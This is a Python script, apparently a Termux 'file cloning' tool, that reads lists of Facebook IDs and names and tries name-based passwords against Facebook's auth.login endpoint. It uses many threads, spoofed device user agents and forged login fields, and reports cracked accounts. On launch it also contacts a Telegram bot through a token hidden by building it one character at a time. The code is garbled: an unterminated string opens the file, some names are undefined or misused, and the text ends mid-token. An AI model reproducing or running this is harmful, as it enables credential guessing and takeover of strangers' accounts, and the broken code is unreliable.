
A='.DEVIL'
import os, sys, base64 as B
C='import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor
import requests
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
from io import BytesIO
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
    os.system('xdg-open https://www.facebook.com/Hammadi.dz.03')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
    os.system('xdg-open https://www.facebook.com/Hammadi.dz.03')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#==================[PERMISSION]==================#
    #sys.exit(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m PLEASE GIVE STORAGE PERMISSION ")
#==================[COLOUR]==================#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\x1b[38;5;46m'
#==================[LOOP]==================#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[];plist=[]
#==================[UA-BOX]====================#
#==================[FILE-M-1]====================#
def f1():  
    mcc = random.choice([
    'SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F',
    'SM-G991B', 'SM-G991N', 'SM-G996B', 'SM-G996N', 'SM-G998B',
    'SM-G998U', 'SM-A525F', 'SM-A526B', 'SM-A325F', 'SM-A326B',
    'SM-A125F', 'SM-A127F', 'SM-F926B', 'SM-F926U', 'SM-M325F',
    'SM-M127F', 'SM-M127G', 'SM-J415F', 'SM-J610F', 'SM-G570F',
    'SM-G973F', 'SM-G975F', 'SM-G977N', 'SM-G770F', 'SM-G970F',
    'SM-G960F', 'SM-G965F', 'SM-G950F', 'SM-G955F', 'SM-A515F',
    'SM-A505F', 'SM-A307F', 'SM-A107F', 'SM-A105F', 'SM-N975F',
    'SM-N970F', 'SM-N960F', 'SM-N950F', 'SM-T515', 'SM-T510',
    'SM-T295', 'SM-T285', 'SM-T385', 'SM-T595', 'SM-T580', 'SM-T585',
    'SM-G390F', 'SM-G398F', 'SM-A102U', 'SM-A102N', 'SM-A102W',
    'SM-A102K', 'SM-A102X', 'SM-A105M', 'SM-A205F', 'SM-A305F',
    'SM-A405F', 'SM-A505G', 'SM-A705F', 'SM-A805F', 'SM-A905F',
    'SM-A908N', 'SM-M105F', 'SM-M205F', 'SM-M305F', 'SM-M405F',
    'SM-G887N', 'SM-G885S', 'SM-G600S', 'SM-G610K', 'SM-G620S',
    'SM-G620K', 'SM-J730G', 'SM-J530F', 'SM-J730F', 'SM-J730FM',
    'SM-A720F', 'SM-A520F', 'SM-A720S', 'SM-G7102', 'SM-G7105',
    'SM-G710K', 'SM-G710L', 'SM-G710S', 'SM-G7508', 'SM-G850F',
    'SM-G860P', 'SM-G870A', 'SM-G870W', 'SM-N915F', 'SM-N916L',
    'SM-N916S', 'SM-N910F', 'SM-N910G', 'SM-N910K', 'SM-N910S',
    'SM-A305G', 'SM-A307G', 'SM-G988B', 'SM-G981B', 'SM-G986B',
    'SM-G991U', 'SM-G996U', 'SM-G998U1', 'SM-F916U', 'SM-F916N',
    'SM-F916B', 'SM-F900F', 'SM-F907N', 'SM-F900U', 'SM-N981B',
    'SM-N986B', 'SM-A908B', 'SM-A908N', 'SM-A908U', 'SM-A9070',
    'SM-A6060', 'SM-A307N', 'SM-A307YN', 'SM-A207F', 'SM-A217F',
    'SM-A315F', 'SM-A315N', 'SM-A315G', 'SM-A315YN', 'SM-M115F',
    'SM-M127G', 'SM-M127F', 'SM-M125F', 'SM-G570Y', 'SM-G570F',
    'SM-G615F', 'SM-J600G', 'SM-J600GT', 'SM-G611F', 'SM-G610F',
    'SM-G530H', 'SM-G530F', 'SM-G532G', 'SM-G532M', 'SM-G532F',
    'SM-G532MT', 'SM-J701F', 'SM-J701M', 'SM-A307YN', 'SM-G965N',
    'SM-G960N', 'SM-A125N', 'SM-A127M', 'SM-A217M', 'SM-M115F',
    'SM-M315F', 'SM-M315N', 'SM-G973U', 'SM-G975U', 'SM-G977U',
    'SM-A920F', 'SM-A920N', 'SM-A920S', 'SM-G887F', 'SM-G960U',
    'SM-G965U', 'SM-G970U', 'SM-G970F', 'SM-A107M', 'SM-A105M',
    'SM-A207M', 'SM-M115M', 'SM-G360F', 'SM-G360M', 'SM-G361F',
    'SM-G361H', 'SM-G361M', 'SM-G532MT', 'SM-J730GM', 'SM-J710FN',
    'SM-J730GM', 'SM-G532M', 'SM-A107M', 'SM-A217N', 'SM-A107M',
    'SM-A107Y', 'SM-G610Y', 'SM-G610L', 'SM-G610K', 'SM-J400M',
    'SM-J410F', 'SM-J415FN', 'SM-A205YN', 'SM-A107F', 'SM-J730GM'])
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(123, 9999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/fr_LY;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1

#==================[FILE-M-2]====================#
def f2():
        url3  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'Dalvik/2.1.0 (Linux; U; Android 13; Huawei P60 Pro Build/HUAWEIP60PRO) [FBAN/Orca-Android;FBAV/472.0.0.42.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/611004321;FBCR/Etisalat;FBMF/Huawei;FBBD/P60 Pro;FBDV/HUAWEI P60 Pro;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1224,height=2800};FB_FW/1;]" 
        return url3
#==================[FILE-M-3]====================#  
def f3():
    oppo = random.choice([
    "OPG850EM", "OPK500UM", "OPK420HM", "OPG910EMW", "OPG810EAW",
    "OPK310IM", "OPK520QM", "OPG820UM", "OPQ730AM", "OPG850QM",
    "OPQ610FM", "OPG710VM", "OPQ720MS", "OPG820QM", "OPQ610TAL",
    "OPK500MM", "OPG710AWM", "OPQ630EAW", "OPK410IM", "OPK500QM",
    "OPK200EMW", "OPG810EM", "OPQ730MM", "OPG820N", "OPK300AM",
    "OPG710PM", "OPQ720CS", "OPG850EMW", "OPG900N", "OPK500QM6",
    "OPK500UM3", "OPK500UM2", "OPG810QM5", "OPQ610QM", "OPK410HM",
    "OPG710EM", "OPQ710MS", "OPK200QM", "OPG820UM1", "OPK300MM",
    "OPQ730QM", "OPK300QM", "OPK500EM", "OPQ720QM", "OPK200QM6",
    "OPG900EM", "OPG850UM", "OPK420QM", "OPG710VMX", "OPK200MM",
    "OPQ610QM6", "OPK300QM6", "OPQ730QM6", "OPK410QM", "OPG900VM",
    "OPG850EMX", "OPQ720QM6", "OPG810QM6", "OPQ610MM", "OPG710EMW",
    "OPK420EMW", "OPG850UMX", "OPG900UM6", "OPK300AM6", "OPK500QM5",
    "OPK200UM6", "OPG820EM", "OPG710UM", "OPQ730QM7", "OPK300QM5",
    "OPQ610EM", "OPK410QM5", "OPK200AM", "OPK420UM", "OPG850QM5",
    "OPK300EM", "OPQ720QM5", "OPG710QM5", "OPG900QM", "OPK200EM",
    "OPG810QM", "OPG710QM", "OPG820QM6", "OPK500QM7", "OPK410QM7",
    "OPK300QM7", "OPQ730QM8", "OPG850QM6", "OPK420QM6", "OPK300QM8",
    "OPK200QM7", "OPK500QM8", "OPQ610QM8", "OPG810QM7", "OPG900QM7",
    "OPK420QM7", "OPG710QM7", "OPQ720QM7", "OPG850QM7", "OPK200QM8",
    "OPG820QM7", "OPK500QM9", "OPQ730QM9", "OPG900QM8", "OPK410QM9"])
    url4 = "[FBAN/FB4A;FBAV/110.0.0.17.29;FBBV/253687513;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/356894217;FBCR/MTS RUS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+oppo+";FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;]"
    return url4
#==================[FILE-M-4]====================#
def f4():
    huawei = random.choice[
    "ANA-NX9", "ELS-NX9", "JNY-LX1", "YAL-L21", "LIO-L29",
    "MAR-LX1A", "VOG-L29", "CLT-L29", "ELE-L29", "TAS-L29",
    "LYA-L29", "STK-LX1", "POT-LX1", "MRD-LX1F", "JNY-L21A",
    "DUB-LX1", "ART-L29", "EVR-L29", "PRA-LX1", "FIG-LX1",
    "ANE-LX1", "BLL-L21", "PAR-LX1", "INE-LX1", "MAR-LX3A",
    "WAS-LX1A", "MLA-L03", "NMO-L31", "LND-L21", "CAN-L11",
    "MYA-L41", "RNE-L21", "SLA-L22", "MHA-L29", "BLA-L29",
    "ALP-L29", "VNS-L31", "PIC-LX9", "BND-L21", "DUA-L22",
    "LYA-L09", "ELE-L09", "ELS-AN00", "ANA-AN00", "JNY-AN00",
    "LIO-AN00", "MAR-AL00", "VOG-AL00", "CLT-AL00", "TAS-AL00",
    "LYA-AL00", "STK-AL00", "POT-AL00", "MRD-AL00", "JNY-AL00",
    "DUB-AL00", "ART-AL00", "EVR-AL00", "PRA-AL00", "FIG-AL00",
    "ANE-AL00", "BLL-AL00", "PAR-AL00", "INE-AL00", "MAR-TL00",
    "WAS-AL00", "MLA-TL00", "NMO-AL00", "LND-TL00", "CAN-AL00",
    "MYA-TL00", "RNE-AL00", "SLA-TL00", "MHA-AL00", "BLA-AL00",
    "ALP-AL00", "VNS-AL00", "PIC-AL00", "BND-AL00", "DUA-AL00",
    "LYA-TL00", "ELE-TL00", "ELS-TL00", "ANA-TL00", "JNY-TL00",
    "LIO-TL00", "MAR-LX2", "VOG-LX2", "CLT-LX2", "TAS-LX2",
    "LYA-LX2", "STK-LX2", "POT-LX2", "MRD-LX2", "JNY-LX2",
    "DUB-LX2", "ART-LX2", "EVR-LX2", "PRA-LX2", "FIG-LX2",
    "ANE-LX2", "BLL-LX2", "PAR-LX2", "INE-LX2", "MAR-LX3",
    "WAS-LX2", "MLA-LX2", "NMO-LX2", "LND-LX2", "CAN-LX2",
    "MYA-LX2", "RNE-LX2", "SLA-LX2", "MHA-LX2", "BLA-LX2",
    "ALP-LX2", "VNS-LX2", "PIC-LX2", "BND-LX2", "DUA-LX2"]
    user_agent = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};' \
                 f'FBBV/{random.randint(1111111, 9999999)};' \
                 f'FBDM/{{density=2.0,width=1080,height=2400}};' \
                 f'FBLC/sw_KE;FBRV/{random.randint(111111111, 666666666)};' \
                 f'FBCR/Google Fi;FBMF/huawei;FBBD/huawei;' \
                 f'FBPN/com.facebook.orca;FBDV/{random.choice(huawei_models)};' \
                 f'FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    
    return user_agent
def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/420.0.0.27.71;FBPN/com.facebook.orca;FBLC/en_US;FBBV/123456789;FBCR/Verizon;FBMF/Google;FBBD/Google;FBDV/Pixel 7;FBSV/14;FBCA/arm64-v8a:armeabi;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/450.0.0.70.65;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/170007000;FBCR/Movistar;FBMF/Huawei;FBBD/Huawei;FBDV/P60 Pro;FBSV/13;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1224,height=2600};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/432.0.0.55.110;FBPN/com.facebook.orca;FBLC/ar_EG;FBBV/150000500;FBCR/Vodafone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 12 Pro;FBSV/13;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/440.0.0.60.90;FBPN/com.facebook.orca;FBLC/en_US;FBBV/160005000;FBCR/T-Mobile;FBMF/Google;FBBD/Google;FBDV/Pixel 8;FBSV/14;FBCA/arm64-v8a:armeabi;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]"
    ua = a+b+c+d
    return ua
#==================[FUNCTIONS]==================#
#token = '7534139444:AAEBv8dIG7lBwNMEFNTPLkAMFOC8ds2Qwi4'
#ID = '6511441369'
#message = "BRAND  8.0"
#requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
token = ''
token += '7'
token += '6'
token += '7'
token += '3'
token += '5'
token += '6'
token += '8'
token += '1'
token += '8'
token += '2'
token += ':'
token += 'A'
token += 'A'
token += 'H'
token += '8'
token += 'y'
token += 'i'
token += 'S'
token += 'a'
token += 'l'
token += 'I'
token += 'A'
token += 'U'
token += 'E'
token += 'N'
token += 'D'
token += 'V'
token += 'E'
token += 'a'
token += 'y'
token += 'M'
token += 'u'
token += '_'
token += 'v'
token += 'X'
token += '9'
token += 'L'
token += 'Y'
token += 'q'
token += 'v'
token += 'P'
token += '6'
token += 'g'
token += 'c'
token += 'M'
token += 'g'
ID = ''
ID += '5'
ID += '3'
ID += '6'
ID += '3'
ID += '4'
ID += '2'
ID += '3'
ID += '2'
ID += '0'
ID += '7'
message = "Hammadi  1.0⩔⨳ BRAND "
requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
def clear():
    os.system("clear")
    print(logo)
def linex():
    print('\033[1;37m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━√ \x1b[1;97m')
def animation(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def m2():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/11.0.0.77.93;FBBV/61279955;FBDM/{density=2.7,width=1440,height=2560};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]"
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', ' ➤ \x1b[1;92m')
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';SX = "{A}({G}+{A}) {A}"

orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
logo=(f"""
      \033[97;1m
\033[1;32m██████╗ ██████╗  █████╗ ███╗  ██╗██████╗ 
\033[1;32m██╔══██╗██╔══██╗██╔══██╗████╗ ██║██╔══██╗
\033[1;32m██████╦╝██████╔╝███████║██╔██╗██║██║  ██║
\033[1;32m██╔══██╗██╔══██╗██╔══██║██║╚████║██║  ██║
\033[1;32m██████╦╝██║  ██║██║  ██║██║ ╚███║██████╔╝
\033[1;32m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═════╝ 
\033[97;1m══════════════════════════════════════════════
\033[1;32m[\033[1;31m•\033[1;31m] \033[1;37m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mHammadi 
\033[1;32m[\033[1;31m•\033[1;31m] \033[1;37m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37m @cn07u 
\033[1;32m[\033[1;31m•\033[1;31m] \033[1;37m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mFREE
\033[1;32m[\033[1;31m•\033[1;31m] \033[1;37m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;32m0.0
\033[1;32m[\033[1;31m•\033[1;31m] \033[1;37m𝐓𝐎𝐎𝐋      : \033[1;37mFILE CLONE
{G}√{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}√   
#
{G}√{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#==================[MENU]==================#
def key():
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
    return uID.upper()
kfeyx = key()
#os.system('xdg-open https://www.facebook.com/Hammadi.dz.03')
def mmk():
    clear()
    print(f'{A}({G}1{A}) {A}FILE CLONING ');print(f'{A}({G}0{A}) {A}EXIT ')
    linex()
    xd=input(f'{A}({G}+{A}) {A}CHOICE   {G}:{A} ')
    if xd in ['1','01']:
        mmku()
    else:
        os.system("clear")
        #print("\033[1;97m\033[1;92m\033[1;97m\033[1;92m TOOLS EXITED DONE")
#==================[FILE]==================#
def mmku():
    clear()
    print(f'{A}({G}+{A}) {A}EXAMPLE  {G}: {A}/sdcard/filename.txt ')
    linex()
    file = input(f'{A}({G}+{A}) {A}INPUT    {G}:{A} ')
    
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f'\033[1;37m\033[1;31m\033[1;37m\033[1;32m WRITE CORRECT PATH')
        time.sleep(1)
        mmku()
    
    clear()
    print(f'({A}1) METHOD ({A}M1)-(NEW)')
    print(f'({A}2) METHOD ({A}M2)-(MIX)')
    print(f'({A}2) METHOD ({A}M3)-(MIX/NEW)')
    print(f'({A}4) METHOD ({A}M4)-(MIX/NEW)')
    linex()
    mth = input(f"\033[1;97m√\033[1;92m√√\033[1;97m√√\033[1;92m CHOICE {G}  √ {G}")    
    clear()
    print(f'{A}({G}+{A}) {A} AUTO PASSWORD')
    print(f'{A}({G}+{A}) {A} LINI PASSWORD')
    linex()
    
    psw = input(f"\033[1;97m√√\033[1;92m√√\033[1;97m√√\033[1;92m CHOICE {G}  √√ {G}")
    
    if psw in ['1', '01']:
       plist.append('first last')       
       plist.append('first12345')
       plist.append('first first')
       plist.append('last last') 
       plist.append('last first') 
       plist.append('firstfirst') 
       plist.append('firstlast') 
       plist.append('lastlast') 
       plist.append('lastfirst') 
       plist.append('firstfirst123')
       plist.append('firstlast123') 
       plist.append('lastlast123') 
       plist.append('first123') 
       plist.append('last123') 
       plist.append('first1234') 
       plist.append('first12345') 
       plist.append('firstlast12345') 
       plist.append('first123456') 
    else:
        try:
            clear()
            ps_limit = int(input(f'{A}({G}1{A}) {A}PASSWORD LIMIT : '))
        except ValueError:
            ps_limit = 1
        for i in range(ps_limit):
           plist.append(input(f'{A}({G}+{A}) {A}PASSWORD NO {i+1} {G}: {A} '))
    
    clear()
    cx = input(f'{A}({G}+{A}) {A}DO YOU WENT SHOW CP ACCOUNT : {G}({A} Y {G}/{A} N {G})').lower()
    if cx in ['y', 'yes']:
        pcp.append('y')
    else:
        pcp.append('n')
    with ThreadPoolExecutor(max_workers=30) as crack_submit:
        clear()
        total_ids = len(fo)
        #print(f'{A}({G}+{A}) TOTAL ID {A}({G}+{A})  {total_ids}')
        #ipinfo = requests.get('http://ip-api.com/json/') 
        #z = json.loads(ipinfo.text) 
        #regi = z['regionName'] 
        #network = z['isp'] 
        #ip = requests.get('https://api.ipify.org').text.strip() 
        #loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()    
        print(f'{A}({G}+{A})  TOTAL ID {A}({G}+{A})  {total_ids}')     
        #print(f'{A}({G}+{A})  IP ADDRESS   : \033[1;32m'+ip+'       ') 
       # print(f'{A}({G}+{A})  COUNTRY      : \033[1;32m'+loc+'       ') 
       # print(f'{A}({G}+{A})  REGION        : \033[1;32m'+regi+'       ') 
       # print(f'{A}({G}+{A})  NETWORK      : \033[1;32m'+network+'       ') 
        #print(f"{A}({G}+{A})  SIM            : {sim}")
        #print(f'{A}({G}+{A})  CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'') 
        print(f'{A}({G}+{A})  If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!')
        linex()
        
        for user in fo:
            ids, names = user.split('|', 1)
            passlist = plist
            if mth == '1':
                crack_submit.submit(graph,ids,names,passlist)
            elif mth == '2':
                crack_submit.submit(graph2,ids,names,passlist)
            elif mth == '3':
                crack_submit.submit(graph3,ids,names,passlist)
            elif mth == '4':
                crack_submit.submit(graph4,ids,names,passlist)   
     #print('\033[1;37m')
     #print(f'{G}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}➤ ')
   #  print(f'{A}({G}+{A}) {A} THE PROCESS HAS COMPLETED')
#     print(f'{A}({G}+{A}) {A} TOTAL OK/CP : '+str(len(oks))+'\n'f'{A}({G}+{A}) {A} TOTAL CP : '+str(len(cps)))
  #   print(f'{G}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}➤ ')
   #  input(f'{A}({G}+{A}) {A} PRESS ENTER TO BACK ')
#==================[M1]==================#
def graph(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write('\r \033[1;37m[\033[1;32mHamadi\033[1;37m]\033[1;33m=\033[1;37m[\033[1;33m%s\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32mOK\033[1;31m|\033[1;32mCP\033[1;31m|\033[1;32m2F\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32m%s\033[1;31m|\033[1;32m%s\033[1;31m|\033[1;32m0\033[1;31m] \033[1;31m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12.0; Sony Xperia 10 V Build/RP1A.210705.244)[FBAN/FB4A;FBAV/421.0.0.79.58;FBBV/3559290;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/5225365;FBCR/STC;FBMF/Sony;FBBD/Sony Xperia 10 V;FBPN/com.facebook.katana;FBDV/Sony Xperia 10 V;FBSV/12.0;FBOP/3;FBCA/arm64-v8a]'+'Dalvik/2.1.0 (Linux; U; Android 13.0; Huawei P60 Pro Build/RP1A.230910.762)[FBAN/FB4A;FBAV/430.0.0.73.55;FBBV/3522222;FBDM/{density=3.5,width=1440,height=3200};FBLC/en_US;FBRV/5802877;FBCR/Zain;FBMF/Huawei;FBBD/Huawei P60 Pro;FBPN/com.facebook.katana;FBDV/Huawei P60 Pro;FBSV/13.0;FBOP/2;FBCA/armeabi-v7a]'+'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/1.8.0(Linux; U; Android 13.0;Pixel 7 Pro Build/US8T2OJ9)[FBAN/FB4A;FBAV/116.0.0.75.43FBBV/8501131FBDM/{density=3.0,width=3120,height=1440}FBLC/fr_FRFBRV/3885056FBCR/O2FBMF/PixelFBBD/PixelFBPN/com.facebook.katanaFBDV/Pixel 7 ProFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/1.8.0(Linux; U; Android 12.0;Moto G Power Build/TTC9CRZG)[FBAN/FB4A;FBAV/101.0.0.2.4FBBV/1417357FBDM/{density=3.0,width=464,height=1069}FBLC/pt_BRFBRV/1214343FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PowerFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/2.1.0(Linux; U; Android 12.0;P30 Pro Build/R18R21B8)[FBAN/FB4A;FBAV/104.0.0.48.94FBBV/1973198FBDM/{density=3.0,width=848,height=914}FBLC/pt_BRFBRV/9112718FBCR/O2FBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P30 ProFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            li = ['28']
            li2 = random.choice(li)
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjc